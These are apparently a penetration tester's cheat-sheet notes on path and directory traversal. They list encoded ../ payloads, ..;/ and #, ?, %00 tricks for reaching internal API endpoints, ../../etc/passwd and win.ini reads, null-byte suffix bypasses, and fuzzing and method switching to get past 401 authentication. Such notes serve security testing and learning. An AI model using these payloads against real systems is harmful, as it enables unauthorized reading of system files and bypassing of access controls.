
  


## Where to Look for

- in API Endpoints /api/v1/users/1
- in params such as file, image url

==Its not always about /etc/passwd SOMETIMES ITS ABOUT INTERNAL API ENUM/seneitive endpoints==

### Scenario

https://host/api/v1/user/1 -> requests data from -> https://internal-v1/user/1

- What if you ask %2e%2e%2f -> url encoded -> ../
- TRY double encoded
- Try triple encoded
- ..;/ -> encode this as well to -> %2e%2e%3b%2f  
    https://host/api/v1/user/ %2e%2e%2fadmin -> requests data from  
    -> https://internal-v1/user/../admin -> https://internal-v1/user/admin

### SCENARIO 2

- this internal thing https://host/api/v1/user/1 -> requests data from -> https://internal-v1/user/1  
    CAN BE DIFFERENT FOR EXAMPLE
    - https://host/api/v1/user/SAM -> requests data from -> https://internal-v1/SAM/user
        - YOU DONT KNOW  
            -==A good trick == use these chars # ? %00
        - use# or ? like this https://host/api/v1/user/admin? ->https://internal-v1/admin?/user
        - now add that with path traversal ../? or url encode it always
        - https[:]//host/api/v1/user/%2e%2e[FUZZ]%3f? -> https://internal-v1/../?/user
        - These things could maybe give you access to swagger.json -> NOW YOU HAVE API DEFINITIONS > TEST THEM ALL

## TESTING CASES

- /api/private - 401
- /api/x/../private - 302 ==interesting==
    - TRY brute force now
    - /api/x../private/FUZZ
- Possible that server blocks or has some defense to relative file path
    - /host/image?name=../../etc/passwd -> failed
    - try this /host/image?name=/etc/passwd -> absolute file path -> got data

## Situation

- http[:]//host/admin -> 401 User authentication failed
    - [DONT STOP HERE , IT's time to try different possibilities]
- 1st REFLEX Brute force
    - /host/admin/FUZZ maybe 1-endpoint could bypass the authentication for example /host/admin/manage [Try to do dumb things that makes no sense to server]
- 2nd REFLEX
    - /host/x/../admin
    - /host/x/..;/admin
- 3rd REFLEX
    - Try different methods like POST , PUT

## Note

- On Windows, both ../ and ..\ are valid directory traversal sequences. The following is an example of an equivalent attack against a Windows-based server:
    - https[:]//insecure-website.com/loadImage?filename=......\windows\win.ini
- Go as far as possible ../../../../.../../../.././etc/passwd
- /proc/self/cwd/ -> current working directory
- /tmp
- /var/www/
- filename =4.jpg works try this filename=../../../proc/self/cwd/4.jpg


  
DIRECTORY TRAVERSALS

[Important]

- ?file=./image.png -> same image
- try ?file=../../../../etc/passwd -> any number of ../ doesnt matter it will just make u go up to / directory
- sometimes, you have this type of files  
    `/file.php?file=/var/www/image.png`  
    For this, you can try,  
    `/file.php?file=/var/www/../../../../etc/passwd`

#### Server Adding suffixes [in older version of php, below 5.3.4 , it uses null byte to remove stuff after that by default]

- Ez way to identify, sometimes, ?file=image1 -> goes to server and server adds .png extension, for example and makes it ?file=image1.png
- Try adding ?file=image1.png , clearly it wont work because server adds extension and makes it , ?file=image.png.png
- Server tries to add suffixes in ur file path , [Ez Bypass is adding null byte %00] it kinda breaks the string
- ?file=../../../etc/passwd%00